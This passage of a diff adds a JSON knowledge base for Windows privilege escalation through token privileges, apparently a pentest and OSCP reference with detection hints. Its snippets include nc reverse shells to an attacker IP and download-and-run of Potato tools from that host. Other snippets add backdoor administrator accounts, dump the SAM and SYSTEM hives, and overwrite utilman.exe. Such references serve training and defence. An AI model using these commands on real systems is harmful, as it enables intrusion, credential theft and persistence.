@@ -1,0 +1,935 @@
+{
+  "phase": {
+    "id": "token-privileges",
+    "title": "Token Privileges",
+    "summary": "Abuse dangerous Windows token privileges (SeImpersonate, SeBackup, SeDebug, SeLoadDriver…). One enabled privilege is often a direct path to SYSTEM.",
+    "icon": "key-round"
+  },
+  "nodes": [
+    {
+      "id": "priv-whoami-priv",
+      "parent_id": null,
+      "kind": "category",
+      "title": "Reading whoami /priv",
+      "severity": "info",
+      "difficulty": "oscp-basic",
+      "summary": "Interpret the output of `whoami /priv`: only **Enabled** privileges are directly usable.",
+      "description_md": "Even a 'Disabled' SeImpersonate is *enableable* by the holding process; treat it as actionable.",
+      "prerequisites": [
+        "user-whoami-all"
+      ],
+      "tags": [
+        "enumeration",
+        "privileges"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Privileges",
+          "code": "whoami /priv"
+        }
+      ],
+      "references": [
+        {
+          "title": "HackTricks — Abusing Tokens",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "priv-se-impersonate",
+      "parent_id": "priv-whoami-priv",
+      "kind": "category",
+      "title": "SeImpersonatePrivilege — the Potato family",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "Held by every IIS / MSSQL / service account by default. Coerce a SYSTEM connection, impersonate, win.",
+      "description_md": "All Potato exploits work by triggering a SYSTEM process to authenticate to a local listener controlled by us, then impersonating the resulting token. Pick the Potato variant by OS version.",
+      "mitre_attack_id": "T1134.001",
+      "tags": [
+        "potato",
+        "impersonation",
+        "privilege-escalation"
+      ],
+      "snippets": [],
+      "references": [
+        {
+          "title": "MITRE T1134.001",
+          "url": "https://attack.mitre.org/techniques/T1134/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "priv-potato-juicy",
+      "parent_id": "priv-se-impersonate",
+      "kind": "technique",
+      "title": "JuicyPotato (≤ Windows Server 2016 / Win 10 1803)",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "Classic DCOM CLSID-based token theft. Patched on newer Windows but still relevant on legacy boxes.",
+      "tags": [
+        "potato",
+        "impersonation"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "JuicyPotato canonical",
+          "code": "JuicyPotato.exe -l 9999 -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Tools\\nc.exe -e cmd.exe 10.10.14.5 4444\" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
+        }
+      ],
+      "references": [
+        {
+          "title": "JuicyPotato (ohpe)",
+          "url": "https://github.com/ohpe/juicy-potato",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "JuicyPotato exploits the DCOM CLSID-based token impersonation path. It listens on a local TCP port, then triggers a DCOM activation request that causes the SYSTEM-context COM server to perform NTLM authentication back to the listener. The resulting NTLM token is impersonated with `ImpersonateNamedPipeClient` and used to spawn a child process as SYSTEM.\n\n**Version limitation**: Patched in Windows 10 1809 / Server 2019. Use RoguePotato, PrintSpoofer, or GodPotato on newer systems.\n\n**CLSID selection**: Different CLSIDs work on different OS builds. Tools like [juicy-potato-clsid](https://github.com/ohpe/juicy-potato/tree/master/CLSID) list viable options per OS.",
+      "detection_hints": "DCOM activation events with non-standard CLSIDs; `JuicyPotato.exe` process name in Sysmon; EID 4624 logon type 9 from low-privilege service account."
+    },
+    {
+      "id": "priv-potato-rogue",
+      "parent_id": "priv-se-impersonate",
+      "kind": "technique",
+      "title": "RoguePotato (Windows 10 1809+ / Server 2019)",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "summary": "Bypasses the JuicyPotato fix by relaying through a remote redirector on port 135.",
+      "description_md": "Requires an external relay host on TCP/135. The classic setup uses socat on the attacker box.",
+      "tags": [
+        "potato",
+        "impersonation"
+      ],
+      "snippets": [
+        {
+          "shell": "bash",
+          "title": "Attacker — socat relay",
+          "code": "sudo socat tcp-listen:135,reuseaddr,fork tcp:VICTIM-IP:9999"
+        },
+        {
+          "shell": "cmd",
+          "title": "Victim — RoguePotato",
+          "code": "RoguePotato.exe -r 10.10.14.5 -e \"C:\\Tools\\nc.exe -e cmd.exe 10.10.14.5 4444\" -l 9999"
+        }
+      ],
+      "references": [
+        {
+          "title": "RoguePotato",
+          "url": "https://github.com/antonioCoco/RoguePotato",
+          "kind": "tool"
+        }
+      ]
+    },
+    {
+      "id": "priv-potato-print",
+      "parent_id": "priv-se-impersonate",
+      "kind": "technique",
+      "title": "PrintSpoofer (Windows 10 / Server 2019+)",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "Abuses the Print Spooler named pipe to coerce a SYSTEM token. Reliable, no external relay.",
+      "tags": [
+        "potato",
+        "impersonation",
+        "printspooler"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Interactive cmd as SYSTEM",
+          "code": "PrintSpoofer64.exe -i -c cmd.exe"
+        },
+        {
+          "shell": "cmd",
+          "title": "Reverse shell as SYSTEM",
+          "code": "PrintSpoofer64.exe -c \"C:\\Tools\\nc.exe -e cmd.exe 10.10.14.5 4444\""
+        }
+      ],
+      "references": [
+        {
+          "title": "PrintSpoofer",
+          "url": "https://github.com/itm4n/PrintSpoofer",
+          "kind": "tool"
+        }
+      ],
+      "detection_hints": "Print Spooler service spawning unexpected child processes. EID 4624 with logon type 9 from `spoolsv.exe`.",
+      "description_md": "PrintSpoofer exploits the Windows Print Spooler service. It creates a named pipe server at `\\\\.\\pipe\\MSSQL$QUERY\\pipe\\spoolss` (or similar), then uses the `SpoolSs` RPC to coerce `spoolsv.exe` (running as SYSTEM) to connect to it. `ImpersonateNamedPipeClient` captures the SYSTEM token. No relay or external connectivity required — entirely local and reliable on Windows 10 / Server 2019+.\n\n**Requirement**: SeImpersonatePrivilege (present on IIS AppPool, SQL Server service, and other network service accounts)."
+    },
+    {
+      "id": "priv-potato-coerced",
+      "parent_id": "priv-se-impersonate",
+      "kind": "technique",
+      "title": "CoercedPotato",
+      "severity": "critical",
+      "difficulty": "oscp-advanced",
+      "summary": "Newer Potato variant that coerces auth via the MS-EFSR protocol.",
+      "tags": [
+        "potato",
+        "impersonation"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "CoercedPotato",
+          "code": "CoercedPotato.exe -c \"cmd /c whoami\" -p \"C:\\Windows\\System32\\cmd.exe\""
+        }
+      ],
+      "references": [
+        {
+          "title": "CoercedPotato",
+          "url": "https://github.com/hackvens/CoercedPotato",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "CoercedPotato triggers SYSTEM-level NTLM authentication via the MS-EFSR (EFS Remote Protocol) or MS-DFSNM RPC interfaces rather than the classic Spooler or DCOM paths. On systems where PrintSpoofer is blocked (Spooler service disabled), CoercedPotato provides an alternative coercion primitive while still requiring only SeImpersonatePrivilege.\n\nThe tool wraps multiple coercion methods and tries each until one succeeds, making it an adaptable choice when specific protocols are filtered or disabled.",
+      "detection_hints": "Unexpected RPC calls to EFSRPC or DFSNM interfaces from low-privilege processes; named pipe creation events (Sysmon EID 17) from service accounts."
+    },
+    {
+      "id": "priv-potato-god",
+      "parent_id": "priv-se-impersonate",
+      "kind": "technique",
+      "title": "GodPotato (.NET, Windows 8 → Server 2022)",
+      "severity": "critical",
+      "difficulty": "oscp-basic",
+      "summary": "Works across the widest range of Windows versions including patched Server 2022.",
+      "tags": [
+        "potato",
+        "impersonation",
+        "dotnet"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "GodPotato (.NET 4)",
+          "code": "GodPotato-NET4.exe -cmd \"cmd /c whoami\""
+        },
+        {
+          "shell": "cmd",
+          "title": "Reverse shell",
+          "code": "GodPotato-NET4.exe -cmd \"C:\\Tools\\nc.exe -e cmd.exe 10.10.14.5 4444\""
+        }
+      ],
+      "references": [
+        {
+          "title": "GodPotato",
+          "url": "https://github.com/BeichenDream/GodPotato",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "GodPotato works across the widest Windows version range (Windows 8 through Server 2022) by leveraging a COM-based activation path that remained unpatched while JuicyPotato and its variants were addressed. It uses a CLSID available on all targeted builds and handles .NET runtime selection automatically (NET2/NET4 variants).\n\n**Why it works on patched systems**: Microsoft patched specific CLSIDs and DCOM paths, but GodPotato uses a different activation mechanism that triggers NTLM loopback authentication in the SYSTEM context, still exploitable via SeImpersonatePrivilege.",
+      "detection_hints": "Low-privilege process spawning children as SYSTEM via CreateProcessWithTokenW; .NET assembly loading from temp paths."
+    },
+    {
+      "id": "priv-se-backup",
+      "parent_id": "priv-whoami-priv",
+      "kind": "technique",
+      "title": "SeBackupPrivilege — read SAM/SYSTEM offline",
+      "severity": "high",
+      "difficulty": "oscp-basic",
+      "summary": "Bypasses ACLs for read; copy the SAM + SYSTEM hives, dump locally, recover NT hashes for the local admin.",
+      "mitre_attack_id": "T1003.002",
+      "tags": [
+        "backup",
+        "sam",
+        "credentials"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Copy hives via reg save (requires SeBackup)",
+          "code": "reg save HKLM\\SAM C:\\Temp\\SAM.hiv\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM.hiv"
+        },
+        {
+          "shell": "bash",
+          "title": "Attacker — extract hashes",
+          "code": "secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1003.002",
+          "url": "https://attack.mitre.org/techniques/T1003/002/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "SeBackupPrivilege bypasses filesystem ACL checks for read operations — it is designed for backup software that must read any file regardless of permissions. An attacker holding this privilege can copy the SAM and SYSTEM registry hives (which are normally locked), transfer them to an attacker-controlled host, and extract local account NTLM hashes offline with `secretsdump.py`.\n\n**Workflow**:\n1. `reg save HKLM\\SAM C:\\Temp\\SAM.hiv` (SeBackup bypasses the ACL on the live hive)\n2. `reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM.hiv`\n3. Transfer both files to Kali\n4. `secretsdump.py -sam SAM.hiv -system SYSTEM.hiv LOCAL`\n5. Pass-the-Hash with the recovered Administrator NTLM hash\n\n**Also useful for**: Reading any file protected by tight DACLs (SSH keys, credential files, application configs).",
+      "detection_hints": "Non-admin use of `reg save` targeting SAM/SYSTEM hives; `robocopy.exe` or `xcopy.exe` with /B flag from non-SYSTEM accounts."
+    },
+    {
+      "id": "priv-se-restore",
+      "parent_id": "priv-whoami-priv",
+      "kind": "technique",
+      "title": "SeRestorePrivilege — overwrite protected files / registry",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Write anywhere on disk and to any registry key; trivial persistence + service binary swap.",
+      "tags": [
+        "restore",
+        "persistence"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Overwrite a system binary (concept)",
+          "code": "Copy-Item -Path payload.exe -Destination 'C:\\Windows\\System32\\utilman.exe' -Force"
+        }
+      ],
+      "references": [],
+      "description_md": "SeRestorePrivilege grants the inverse capability to SeBackupPrivilege: it bypasses filesystem ACL checks for **write** operations. Any file on any NTFS volume can be overwritten or created, regardless of its DACL.\n\n**Attack scenarios**:\n- **Service binary swap**: Overwrite `C:\\Windows\\System32\\utilman.exe` or another auto-started binary with a payload, then trigger it at logon.\n- **Persistence**: Write to `C:\\Windows\\System32\\` or protected startup locations.\n- **Registry restore**: `SeRestorePrivilege` also applies to registry; use `reg load` + `reg add` on system hives.\n\n**Important note**: Overwriting system binaries is loud and destructive — always back up the original first in labs.",
+      "detection_hints": "Unexpected writes to `C:\\Windows\\System32\\` or other protected directories by non-SYSTEM accounts; EID 4670 (permissions changed) on system files."
+    },
+    {
+      "id": "priv-se-takeownership",
+      "parent_id": "priv-whoami-priv",
+      "kind": "technique",
+      "title": "SeTakeOwnershipPrivilege",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Take ownership of any object → grant yourself full control → modify protected service binary.",
+      "tags": [
+        "takeownership",
+        "acl"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Take ownership + grant",
+          "code": "takeown /f C:\\Windows\\System32\\Utilman.exe\nicacls C:\\Windows\\System32\\Utilman.exe /grant %USERNAME%:F"
+        }
+      ],
+      "references": [],
+      "description_md": "SeTakeOwnershipPrivilege allows a process to take ownership of any securable object (files, registry keys, services) without needing the existing owner's consent. Once ownership is taken, the new owner can modify the DACL to grant themselves full control, then make arbitrary modifications.\n\n**Typical chain**:\n1. `takeown /f <target>` — acquires ownership via SeTakeOwnershipPrivilege\n2. `icacls <target> /grant %USERNAME%:F` — adds full-control ACE\n3. Replace/read the now-accessible resource\n\n**Useful targets**: Protected service binaries, SAM/SYSTEM hives, Winlogon registry keys, SSH authorized_keys for other users.",
+      "detection_hints": "Ownership changes (EID 4670) on system files or registry keys by non-SYSTEM accounts; `takeown.exe` or `SetSecurityInfo` API calls from low-privilege processes."
+    },
+    {
+      "id": "priv-se-debug",
+      "parent_id": "priv-whoami-priv",
+      "kind": "technique",
+      "title": "SeDebugPrivilege — token theft from SYSTEM processes",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Open any process, duplicate its token, impersonate.",
+      "mitre_attack_id": "T1134.002",
+      "tags": [
+        "debug",
+        "tokenstealing"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Verify SeDebug enabled",
+          "code": "whoami /priv | findstr /i SeDebug"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1134.002",
+          "url": "https://attack.mitre.org/techniques/T1134/002/",
+          "kind": "mitre"
+        }
+      ],
+      "description_md": "SeDebugPrivilege grants the right to open any process with `PROCESS_ALL_ACCESS`, bypassing the normal DACL check. An attacker with this privilege can:\n\n1. **Token duplication**: `OpenProcess(SYSTEM_PID)` → `OpenProcessToken` → `DuplicateTokenEx` (TokenImpersonation) → `ImpersonateLoggedOnUser` → run code as SYSTEM\n2. **Code injection**: Write a shellcode payload into a SYSTEM process (lsass, winlogon) via `WriteProcessMemory` + `CreateRemoteThread`\n3. **Credential extraction**: Open LSASS to extract memory for offline parsing with Mimikatz/pypykatz\n\nAlso useful as a pre-requisite for token theft via the Incognito technique or `Invoke-TokenManipulation`.",
+      "detection_hints": "PROCESS_VM_READ or PROCESS_ALL_ACCESS handle opens to lsass.exe or winlogon.exe from non-SYSTEM processes (EID 4656); WriteProcessMemory API calls across privilege boundaries."
+    },
+    {
+      "id": "priv-se-loaddriver",
+      "parent_id": "priv-whoami-priv",
+      "kind": "technique",
+      "title": "SeLoadDriverPrivilege — BYOVD",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "summary": "Load a vulnerable signed driver (Capcom.sys, DBUtil_2_3.sys) and pivot to kernel.",
+      "tags": [
+        "byovd",
+        "driver",
+        "kernel"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Concept (varies per driver loader)",
+          "code": "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Tools\\Capcom.sys"
+        }
+      ],
+      "references": [
+        {
+          "title": "EoPLoadDriver",
+          "url": "https://github.com/TarlogicSecurity/EoPLoadDriver",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "SeLoadDriverPrivilege allows loading an arbitrary kernel driver (`NtLoadDriver` syscall). The **Bring Your Own Vulnerable Driver (BYOVD)** technique exploits a signed but vulnerable driver to pivot from user-land to ring-0.\n\n**Classic targets**:\n- `Capcom.sys` (arbitrary kernel shellcode execution, ring-0 callback)\n- `DBUtil_2_3.sys` (Dell firmware update driver, arbitrary kernel R/W)\n- `RTCore64.sys` (MSI Afterburner driver, used by Terminator AV killer)\n\n**Workflow**: Load the vulnerable driver via `EoPLoadDriver.exe`, then exploit the driver's IOCTL interface for kernel-level code execution or LSASS protection bypass.",
+      "detection_hints": "New driver load events (EID 6 in Sysmon for driver loads); known-vulnerable driver hashes in detection feeds; `NtLoadDriver` syscalls from non-SYSTEM processes."
+    },
+    {
+      "id": "priv-se-managevolume",
+      "parent_id": "priv-whoami-priv",
+      "kind": "technique",
+      "title": "SeManageVolumePrivilege — modify C:\\ ACLs",
+      "severity": "high",
+      "difficulty": "oscp-advanced",
+      "summary": "Grant yourself write to anywhere on the system volume → swap a service binary.",
+      "tags": [
+        "volume",
+        "acl"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "SeManageVolume exploit",
+          "code": "SeManageVolumeExploit.exe"
+        }
+      ],
+      "references": [
+        {
+          "title": "SeManageVolumeExploit",
+          "url": "https://github.com/CsEnox/SeManageVolumeExploit",
+          "kind": "tool"
+        }
+      ],
+      "description_md": "SeManageVolumePrivilege allows performing volume maintenance operations. The `SeManageVolumeExploit` PoC by CsEnox leverages this privilege to grant `BUILTIN\\Users` write access to the root of the C:\\ drive, effectively making the entire system volume writable by any user.\n\n**Post-exploitation**: With C:\\ writable, swap any service binary or plant DLLs in privileged service directories. The exploit achieves this by directly manipulating NTFS security descriptors via the volume management API.\n\n**Affected versions**: Windows 10/11, Server 2016-2022 — wherever SeManageVolumePrivilege is granted to non-SYSTEM accounts.",
+      "detection_hints": "Unusual `FSCTL_SD_GLOBAL_CHANGE` control codes; changes to root directory ACL (`C:\\`); subsequent writes to `C:\\Windows\\System32\\` by non-admin accounts."
+    },
+    {
+      "id": "priv-se-tcb",
+      "parent_id": "priv-whoami-priv",
+      "kind": "technique",
+      "title": "SeTcbPrivilege — act as part of the OS",
+      "severity": "critical",
+      "difficulty": "red-team",
+      "summary": "The strongest single privilege: create arbitrary tokens including SYSTEM.",
+      "tags": [
+        "tcb",
+        "trustedcomputingbase"
+      ],
+      "snippets": [
+        {
+          "shell": "text",
+          "title": "Concept",
+          "code": "Typically chained with LSA logon APIs from custom code; see references."
+        }
+      ],
+      "references": [
+        {
+          "title": "Privilege::SeTcb",
+          "url": "https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system",
+          "kind": "msdoc"
+        }
+      ],
+      "description_md": "SeTcbPrivilege (\"Act as Part of the Operating System\") is the strongest Windows privilege. It allows creating access tokens via `LsaLogonUser` with arbitrary SIDs, groups, and privileges — effectively forging any identity including SYSTEM or custom tokens with elevated SIDs.\n\n**Attack method**: Call `LsaLogonUser` with `Tcb` privilege to create a logon session with any desired SID set, then use `CreateProcessWithTokenW` to spawn a process in that session.\n\nThis privilege is **not normally grantable** to regular users — it typically appears on legacy services, third-party endpoint management agents, or through misconfguration. Its presence on a non-SYSTEM account is an immediate critical finding.\n\n**Detection**: Any process holding SeTcbPrivilege that is not `lsass.exe` or `services.exe` is anomalous.",
+      "detection_hints": "Processes holding SeTcbPrivilege that are not SYSTEM or core Windows services; `LsaLogonUser` API calls with unusual logon types; EID 4703 privilege assignment."
+    },
+    {
+      "id": "priv-efs-potato",
+      "kind": "technique",
+      "title": "EfsPotato",
+      "summary": "Abuses the Windows EFS (Encrypting File System) RPC interface to coerce SYSTEM-level NTLM authentication and capture an impersonation token, escalating from SeImpersonatePrivilege to SYSTEM.",
+      "severity": "critical",
+      "parent_id": "priv-se-impersonate",
+      "description_md": "EfsPotato exploits the `MS-EFSR` (Encrypting File System Remote Protocol) RPC interface. When a low-privileged process (e.g., a service account with SeImpersonatePrivilege) calls certain EFS RPC methods, the LSASS process — running as SYSTEM — performs an NTLM authentication attempt back to a locally controlled named-pipe server. The attacker captures the token and uses `ImpersonateNamedPipeClient` + `CreateProcessWithTokenW` to spawn a SYSTEM shell.\n\nAffects unpatched Windows 10/11 and Server 2016-2022 where `EfsRpcOpenFileRaw` is accessible. Patch: KB5005565 (Sep 2021) partially mitigates but bypass variants exist.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1134.001",
+      "detection_hints": "Monitor named-pipe creation by non-SYSTEM low-integrity processes. Alert on `EfsRpcOpenFileRaw` calls from unexpected principals. Sysmon Event ID 17/18 for pipe creation.",
+      "tags": [
+        "potato",
+        "efs",
+        "rpc",
+        "token-impersonation",
+        "local-privilege-escalation"
+      ],
+      "prerequisites": [
+        "priv-se-impersonate"
+      ],
+      "related": [
+        "priv-potato-juicy",
+        "priv-potato-rogue",
+        "priv-sharp-efs-potato"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Run EfsPotato to spawn SYSTEM shell",
+          "code": "EfsPotato.exe \"cmd.exe /c whoami > C:\\Temp\\whoami.txt\"",
+          "description": "Executes the payload as SYSTEM via EFS RPC token coercion. Binary must be transferred to target first.",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "Transfer and execute EfsPotato",
+          "code": "Invoke-WebRequest -Uri 'http://10.10.14.5/EfsPotato.exe' -OutFile 'C:\\Temp\\EfsPotato.exe'\nC:\\Temp\\EfsPotato.exe 'cmd /c net user pwned P@ssw0rd123 /add && net localgroup administrators pwned /add'",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "EfsPotato GitHub - zcgonvh",
+          "url": "https://github.com/zcgonvh/EfsPotato",
+          "kind": "tool"
+        },
+        {
+          "title": "HackTricks - Juicy Potato / EFS Variants",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "priv-sharp-efs-potato",
+      "kind": "tool",
+      "title": "SharpEfsPotato",
+      "summary": "C# managed implementation of the EfsPotato technique; leverages MS-EFSR RPC to obtain SYSTEM token from SeImpersonatePrivilege without dropping a native binary.",
+      "severity": "critical",
+      "parent_id": "priv-se-impersonate",
+      "description_md": "SharpEfsPotato is a fully managed C# tool that performs the same EFS RPC coercion as EfsPotato but can be loaded in-memory via `execute-assembly` in Cobalt Strike / Havoc / Sliver, avoiding disk writes. It calls `EfsRpcOpenFileRaw` against the loopback, catches the SYSTEM NTLM authentication on a local named pipe, duplicates the token, and executes a caller-supplied command.\n\nUseful for OSCP lab machines and real engagements where AV blocks native PE execution.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1134.001",
+      "detection_hints": "AMSI and ETW scanning of in-memory .NET assemblies. Monitor for `EfsRpcOpenFileRaw` via Windows Security Auditing of RPC calls.",
+      "tags": [
+        "potato",
+        "efs",
+        "csharp",
+        "execute-assembly",
+        "token-impersonation"
+      ],
+      "prerequisites": [
+        "priv-se-impersonate"
+      ],
+      "related": [
+        "priv-efs-potato",
+        "priv-potato-juicy"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Load SharpEfsPotato via execute-assembly (Cobalt Strike)",
+          "code": "# From Cobalt Strike beacon:\nexecute-assembly C:\\Tools\\SharpEfsPotato.exe -p C:\\Windows\\system32\\cmd.exe -a \"/c net user hacked P@ssw0rd /add\"",
+          "requires_admin": false
+        },
+        {
+          "shell": "powershell",
+          "title": "In-memory load via PowerShell reflection",
+          "code": "$data = (Invoke-WebRequest -Uri 'http://10.10.14.5/SharpEfsPotato.exe' -UseBasicParsing).Content\n[System.Reflection.Assembly]::Load($data) | Out-Null\n[SharpEfsPotato.Program]::Main(@('-p','cmd.exe','-a','/c whoami > C:\\Temp\\out.txt'))",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "SharpEfsPotato GitHub - bugch3ck",
+          "url": "https://github.com/bugch3ck/SharpEfsPotato",
+          "kind": "tool"
+        },
+        {
+          "title": "MITRE ATT&CK T1134.001 - Token Impersonation/Theft",
+          "url": "https://attack.mitre.org/techniques/T1134/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "priv-local-potato",
+      "kind": "technique",
+      "title": "LocalPotato (CVE-2023-21746)",
+      "summary": "Exploits a Windows NTLM reflection flaw (CVE-2023-21746) in the local NTLM authentication path to write arbitrary files as SYSTEM, enabling privilege escalation without SeImpersonatePrivilege.",
+      "severity": "critical",
+      "parent_id": "priv-se-impersonate",
+      "description_md": "LocalPotato (CVE-2023-21746) is a Windows NTLM reflection vulnerability. Unlike earlier Potato attacks that require SeImpersonatePrivilege, LocalPotato abuses the `NTLM Security Support Provider` local authentication loop to authenticate a SYSTEM-level process and substitute the security context for an attacker-controlled one. This yields an impersonation token without needing a privileged service account token.\n\nPatched in January 2023 Patch Tuesday. Affects Windows 10/11, Server 2012–2022 without the patch.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1134.001",
+      "detection_hints": "Patch CVE-2023-21746. Monitor for unusual NTLM loopback authentications (Event ID 4624 type 3 from 127.0.0.1). Sysmon pipe events from low-privilege processes.",
+      "tags": [
+        "potato",
+        "cve-2023-21746",
+        "ntlm-reflection",
+        "local-privilege-escalation"
+      ],
+      "related": [
+        "priv-efs-potato",
+        "priv-potato-rogue"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "LocalPotato arbitrary file write as SYSTEM",
+          "code": "LocalPotato.exe -i C:\\Temp\\payload.dll -o C:\\Windows\\System32\\wbem\\evil.dll",
+          "description": "Writes attacker-controlled DLL into a SYSTEM-owned directory for subsequent hijack.",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "LocalPotato - CVE-2023-21746 Analysis (Decoder.cloud)",
+          "url": "https://www.decoder.cloud/2023/01/localpotato-when-swapping-the-context.html",
+          "kind": "blog"
+        },
+        {
+          "title": "NVD CVE-2023-21746",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-21746",
+          "kind": "cve"
+        }
+      ]
+    },
+    {
+      "id": "priv-dcom-potato",
+      "kind": "technique",
+      "title": "DCOMPotato",
+      "summary": "Uses DCOM object activation with a marshalled IStorage to trigger SYSTEM-level NTLM authentication on a local named pipe, escalating from SeImpersonatePrivilege to SYSTEM.",
+      "severity": "critical",
+      "parent_id": "priv-se-impersonate",
+      "description_md": "DCOMPotato activates a specific DCOM object (e.g., `CLSID_ShellWindows`) and passes a specially crafted marshalled `IStorage` object. This causes the DCOM server (running as SYSTEM) to perform an NTLM authentication attempt that the attacker captures on a controlled named pipe. The resulting impersonation token is used to spawn a SYSTEM process.\n\nSimilar in concept to RoguePotato but leverages DCOM activation instead of RPC endpoint manipulation.",
+      "difficulty": "oscp-advanced",
+      "mitre_attack_id": "T1134.001",
+      "detection_hints": "Monitor for DCOM activation events (Event ID 10016) from low-privilege contexts. Detect named-pipe creation by non-SYSTEM processes attempting to receive NTLM tokens.",
+      "tags": [
+        "potato",
+        "dcom",
+        "token-impersonation",
+        "local-privilege-escalation"
+      ],
+      "prerequisites": [
+        "priv-se-impersonate"
+      ],
+      "related": [
+        "priv-potato-rogue",
+        "priv-efs-potato"
+      ],
+      "snippets": [
+        {
+          "shell": "cmd",
+          "title": "Execute DCOMPotato",
+          "code": "DCOMPotato.exe cmd.exe \"/c whoami > C:\\Temp\\system.txt\"",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "DCOMPotato GitHub - zcgonvh",
+          "url": "https://github.com/zcgonvh/DCOMPotato",
+          "kind": "tool"
+        },
+        {
+          "title": "MITRE ATT&CK T1134.001",
+          "url": "https://attack.mitre.org/techniques/T1134/001/",
+          "kind": "mitre"
+        }
+      ]
+    },
+    {
+      "id": "priv-sweet-potato",
+      "kind": "tool",
+      "title": "SweetPotato",
+      "summary": "Multi-vector Potato framework combining JuicyPotato, PrintSpoofer, and EfsPotato coercion paths; automatically selects the best available escalation path on the target.",
+      "severity": "critical",
+      "parent_id": "priv-se-impersonate",
+      "description_md": "SweetPotato (by EthicalChaos) is a consolidated C# tool that bundles multiple Potato escalation vectors:\n- **PrintSpoofer** path (SpoolSS named-pipe coercion)\n- **EFS RPC** coercion (`EfsRpcOpenFileRaw`)\n- **StorageObject / DCOM** coercion\n\nIt probes each method in order and uses the first that succeeds, making it a reliable all-in-one choice for engagements and OSCP labs. Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.",
+      "difficulty": "oscp-basic",
+      "mitre_attack_id": "T1134.001",
+      "detection_hints": "Behavioural rule: low-privilege process creating a named pipe then immediately calling `CreateProcessWithTokenW` or `CreateProcessAsUserW`.",
+      "tags": [
+        "potato",
+        "sweet-potato",
+        "multi-vector",
+        "token-impersonation",
+        "oscp"
+      ],
+      "prerequisites": [
+        "priv-se-impersonate"
+      ],
+      "related": [
+        "priv-efs-potato",
+        "priv-dcom-potato",
+        "priv-potato-print"
+      ],
+      "snippets": [
+        {
+          "shell": "powershell",
+          "title": "Download and execute SweetPotato",
+          "code": "Invoke-WebRequest -Uri 'http://10.10.14.5/SweetPotato.exe' -OutFile 'C:\\Temp\\SweetPotato.exe'\nC:\\Temp\\SweetPotato.exe -e EfsRpc -p C:\\Windows\\System32\\cmd.exe -a \"/c net user sweetpwn P@ssw0rd /add && net localgroup administrators sweetpwn /add\"",
+          "requires_admin": false
+        },
+        {
+          "shell": "cmd",
+          "title": "SweetPotato reverse shell",
+          "code": "SweetPotato.exe -e EfsRpc -p C:\\Temp\\nc.exe -a \"10.10.14.5 4444 -e cmd.exe\"",
+          "requires_admin": false
+        }
+      ],
+      "references": [
+        {
+          "title": "SweetPotato GitHub - EthicalChaos",
+          "url": "https://github.com/CCob/SweetPotato",
+          "kind": "tool"
+        },
+        {
+          "title": "HackTricks - SeImpersonatePrivilege",
+          "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens",
+          "kind": "hacktricks"
+        }
+      ]
+    },
+    {
+      "id": "priv-remote-potato0",
+      "kind": "technique",
+      "title": "RemotePotato0",
+      "summary": "Cross-session NTLM relay attack; coerces a logged-in high-privilege user in another RDP session to authenticate to an attacker-controlled responder, relaying to LDAP to escalate privileges.",
+      "severity": "critical",
+      "parent_id": "priv-se-impersonate",
